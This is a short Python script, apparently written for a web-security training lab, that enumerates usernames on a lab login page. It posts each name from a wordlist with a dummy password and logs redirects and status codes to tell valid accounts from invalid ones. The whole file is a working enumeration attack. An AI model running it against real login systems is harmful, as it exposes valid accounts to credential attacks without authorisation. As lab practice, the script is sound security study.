import requests

URL = "https://0a7c00060403afd6806b213600c5007d.web-security-academy.net/login"

with open("expanded_list.txt", "r") as f:
    usernames = f.read().splitlines()

print("[*] ユーザー名の列挙（Enumeration）を開始します！")



for username in usernames:
    data = {
        "username": username,
        "password": 'a'
    }

    # リダイレクト有無を判定するため、POST後に自動追従しない
    response = requests.post(URL, data=data, allow_redirects=False, timeout=10)

    is_redirect = response.is_redirect or response.is_permanent_redirect
    location = response.headers.get("Location", "-")

    print(
        f"username: {username:15} | redirect: {is_redirect!s:5} "
        f"| status: {response.status_code} | location: {location}"
    )